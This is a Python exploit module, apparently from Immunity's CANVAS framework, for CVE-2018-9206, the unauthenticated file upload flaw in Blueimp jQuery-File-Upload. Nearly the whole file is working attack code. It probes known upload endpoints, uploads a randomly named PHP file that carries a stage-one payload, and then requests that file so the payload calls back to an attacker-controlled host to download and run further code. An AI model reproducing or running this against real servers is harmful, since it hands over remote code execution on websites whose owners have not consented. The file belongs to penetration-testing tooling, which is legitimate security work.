#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import re
import sys
import random
import string
import time
import logging

if "." not in sys.path: sys.path.append(".")

from libs import spkproxy
from exploitutils import *
from tcpexploit import tcpexploit
from phplistener import get_php_stage1

NAME                            = "Blueimp jQuery-File-Upload Arbitrary Upload"
DESCRIPTION                     = "Unauthenticated arbitrary file upload vulnerability in Blueimp jQuery-File-Upload <= v9.22.0"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = ""
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["References"]     = ["http://www.vapidlabs.com/advisory.php?v=204"]
DOCUMENTATION["CVE Name"]       = "CVE-2018-9206"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9206"
DOCUMENTATION["Notes"]          = """
The exploit tests different paths on the target server
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']             = [ "All" ]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.version            = 0
        self.done               = 0
        self.name               = NAME
        self.basepath           = "/"
        self.username           = ""
        self.password           = ""
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""

        self.jquery_paths       = [
            "/jQuery-File-Upload",
            "/jquery-file-upload"
        ]

        self.vulnpaths    = [
            "/server/php/index.php",
            "/server/php/upload.class.php",
            "/server/php/UploadHandler.php",
            "/php/index.php",
            "/example/upload.php"
        ]

        self.upload_paths = [
            "/server/php/files/",
            "/example/files/",
            "/php/files/"
        ]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host     = self.argsDict.get("hostname", self.hostname)
        self.hostname = self.argsDict.get("hostname", self.hostname)
        self.port     = int(self.argsDict.get("port",self.port))
        self.basepath = self.argsDict.get("basepath", self.basepath)
        self.ssl      = self.argsDict.get("ssl",self.ssl)
        self.allhosts = [self.hostname]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]

    def getfile(self, fname):
        phpfile = """-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="files[]"; filename="{}"
Content-Type: application/octet-stream

<?php

{}

?>

-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="filename"

{}
-----------------------------3922242971797626524322043819--

""".format(fname, self.get_php_to_mosdef(), fname)

        return phpfile

    def run(self):
        self.getargs()
        #test = self.test()
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))
        logging.info("Attacking %s:%d" % (self.hostname, self.port))
        logging.info("VHost: %s" % self.hostname)

        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        auth = None
        if self.basicauth_user != "":
            auth = spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)

        fname_shell = randomstring(16) + ".php" #''.join(random.choice(string.ascii_letters) for _ in range(16)) #
        fname_multipart_data = self.getfile(fname_shell)
        found_path = False
        useragentstring = ''
        vulnerable_path = ''
        for jquery_path in self.jquery_paths:
            useragentstring = protocol + "://" + self.host + ":" + str(self.port) + "/" + self.basepath
            UA = spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
            for vulpath in self.vulnpaths:
                UA.addHeader("Content-Type","multipart/form-data; boundary=---------------------------3922242971797626524322043819")
                vulnerable_path = jquery_path + vulpath
                logging.info("Checking for vulnerable path: {}".format(useragentstring + vulnerable_path))
                response, response_code = UA.POST(vulnerable_path, fname_multipart_data, return_response_code=True)
                if response_code == 200:
                    found_path = True
                    break

                vulnerable_path = jquery_path + vulpath + "/" + randomstring(10)
                logging.info("Checking for vulnerable path: {}".format(useragentstring + vulnerable_path))
                response, response_code = UA.POST(vulnerable_path, fname_multipart_data, return_response_code=True)
                if response_code == 200:
                    found_path = True
                    break

            if found_path:
                logging.warning("Found vulnerable path: {}".format(useragentstring + vulnerable_path))
                break

        # Wait for the upload
        time.sleep(3)
        ret = 0
        if found_path:
            UA.clearHeaders()
            for upload_path in self.upload_paths:
                test_path = jquery_path + upload_path + fname_shell
                logging.info("Triggering our uploaded callback: {}".format(useragentstring + test_path))
                UA.GET(test_path, noresponse=True)
                for i in xrange(0, 5): #wait five seconds for callback
                    time.sleep(1)
                    ret = self.ISucceeded()
                    if ret:
                        break

                if ret:
                    break

        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))

        return ret

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        localhost = self.callback.ip
        localport = self.callback.port
        logging.info("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars  = "" #none for this one
        ret       = get_php_stage1(badchars,localhost,localport)

        return ret

    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

